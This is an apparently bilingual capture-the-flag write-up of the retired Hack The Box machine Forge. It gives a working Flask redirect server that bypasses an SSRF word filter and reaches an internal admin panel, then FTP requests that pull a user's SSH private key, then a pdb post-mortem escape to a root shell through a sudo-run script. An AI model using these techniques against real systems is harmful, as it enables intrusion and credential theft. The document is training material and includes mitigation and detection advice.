---
machine: Forge
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, ftp, ssh, pdb]
---

# Forge — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site uploads images from a URL and blocks words such as `admin` and `127.0.0.1`. A server we control returns a redirect to `admin.forge.htb`, which the client follows and bypasses the filter. The admin panel has another SSRF that queries the internal FTP; it exposes the user flag and an SSH key. Escalation uses `pdb.post_mortem` in a script run with `sudo`.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 20.04 and `80/tcp` Apache serving `forge.htb`.
- `21/tcp` is filtered: FTP exists but is only reachable from localhost.
- `admin.forge.htb` says it can only be visited from localhost.

## Enumeration

- `/upload` accepts a local file or a URL; the response stores the content under `/uploads/<id>`.
- The backend uses `python-requests`, so it follows HTTP redirects by default.
- The filter blocks `admin`, `localhost` and `127.0.0.1`, but not an external domain that redirects.

## Foothold

Run Flask returning `302` to `http://admin.forge.htb/`. The site requests it, follows the redirect and returns the admin panel. That panel can query local FTP; request `/user.txt` and `/home/user/.ssh/id_rsa`.

```python
from flask import Flask, redirect
app = Flask(__name__)
@app.route("/")
def go():
    return redirect("http://admin.forge.htb/")
app.run(host="0.0.0.0", port=80)
```

Use the key to log in over SSH as `user`.

## Lateral movement

There is no other host. The pivot is from the web to internal FTP, from FTP to the SSH key and from there to the `user` account.

## Privilege escalation

`sudo -l` allows `/usr/bin/python3 /opt/remote-manage.py`. The script listens on a random port, asks for a password and converts the menu option with `int()`. Sending non-numeric text raises `ValueError` and enters `pdb.post_mortem`, where `os` can be imported and a shell started.

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# In another session:
nc 127.0.0.1 <PORT>
# Password, then a non-numeric option:
0xdf
# At the pdb prompt:
import os; os.system("/bin/bash")
```

## Evidence

- Admin panel loaded through the external redirect.
- FTP listing with `user.txt` and `id_rsa`.
- `pdb` prompt and a root shell.

## Lessons learned

- A word filter is not a destination allowlist.
- SSRF can be chained with a redirect to reach internal services.
- An interactive debugger in a privileged process is code execution.

## Mitigation and detection

- Resolve the URL and validate the final destination against an allowlist.
- Block redirects and internal ranges in the server-side fetcher.
- Never leave `pdb` in production scripts or run them with privileges.

## References

- [0xdf — Forge](https://0xdf.gitlab.io/2022/01/22/htb-forge.html)
- [IppSec — Forge](https://www.youtube.com/watch?v=-BL4uevhERg)
- [Hack The Box — Forge](https://app.hackthebox.com/machines/forge)
